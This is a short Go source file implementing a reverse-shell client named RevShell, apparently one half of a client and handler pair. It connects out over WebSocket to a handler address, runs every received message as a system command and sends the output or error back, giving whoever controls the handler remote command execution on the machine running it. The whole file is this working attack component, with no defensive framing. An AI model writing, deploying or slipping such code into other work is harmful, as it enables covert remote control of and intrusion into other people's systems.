package main

import (
	"github.com/gorilla/websocket"
)

func RevShell(handlerAddr string) {
	u := "ws://" + handlerAddr + "/ws"
	conn, _, err := websocket.DefaultDialer.Dial(u, nil)
    if err != nil {
        return
    }
    defer conn.Close()

    for {
        // Read the command string from your shell_handler.go
        _, msg, err := conn.ReadMessage()
        if err != nil {
            return
        }

        // 1. Get the *exec.Cmd object from your existing function
        cmd := execCommand(string(msg))

        // 2. Execute it! .CombinedOutput() runs the command and 
        // returns (stdout + stderr) as a []byte
        out, err := cmd.CombinedOutput()
        if err != nil {
            // If the command fails (e.g. 'ls folder_that_doesnt_exist')
            // we still want to send the error message back to our handler
            conn.WriteMessage(websocket.TextMessage, []byte(err.Error()))
            continue
        }

        // 3. Send the successful output back
        conn.WriteMessage(websocket.TextMessage, out)
    }
}